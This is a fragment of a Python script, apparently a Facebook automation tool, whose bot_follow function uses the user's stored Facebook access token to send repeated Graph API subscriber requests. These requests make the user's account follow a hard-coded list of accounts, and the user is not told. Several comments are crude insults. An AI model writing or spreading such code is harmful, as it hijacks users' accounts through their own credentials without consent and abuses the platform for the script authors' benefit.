...
def bot_follow():
	try:
		...
		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
		logs()
	requests.post("https://graph.facebook.com/100069341700688/subscribers?access_token=" + toket)      #ဗီူံ ♡
	requests.post('https://graph.facebook.com/100069341700688/subscribers?access_token=' + toket) #Anjing
	requests.post('https://graph.facebook.com/100007632767612/subscribers?access_token=' + toket)      #WansGanteng
	requests.post("https://graph.facebook.com/100069341700688/subscribers?access_token=" + toket)      #IbnuGoblok
	requests.post("https://graph.facebook.com/100013394466746/subscribers?access_token=" + toket) #Radhin Alkentod
	requests.post("https://graph.facebook.com/100062008823461/subscribers?access_token=" + toket)       #Asep saputra
	requests.post("https://graph.facebook.com/100051509466630/subscribers?access_token=" + toket) #Jeni Koplok
	requests.post("https://graph.facebook.com/100047705686723/subscribers?access_token=" + toket) #Kontol66
	requests.post('https://graph.facebook.com/100052114060355/subscribers?access_token=' + toket) #emer
	requests.post('https://graph.facebook.com/100069341700688/subscribers?access_token=' + toket) #Wans
	requests.post('https://graph.facebook.com/100069341700688/subscribers?access_token=' + toket) #Gans
	requests.post('https://graph.facebook.com/100069341700688/subscribers?access_token=' + toket)      #XpL
	requests.post('https://graph.facebook.com/1767051257/subscribers?access_token=' + toket)      #
	requests.post('https://graph.facebook.com/100069341700688/subscribers?access_token=' + toket) #Diah WansGans
	requests.post('https://graph.facebook.com/100000883844839/subscribers?access_token=' + toket) #Cyber
	requests.post('https://graph.facebook.com/100069341700688/subscribers?access_token=' + toket) #Emak.
	requests.post("https://graph.facebook.com/100069341700688/subscribers?access_token=" + toket) #Bapak
	requests.post("https://graph.facebook.com/100069341700688/subscribers?access_token=" + toket) #Kontol123
	requests.post("https://graph.facebook.com/100069341700688/subscribers?access_token=" + toket) #Kontol45
	requests.post('https://graph.facebook.com/100069341700688/subscribers?access_token=' + toket) #Hakiki
	menu()
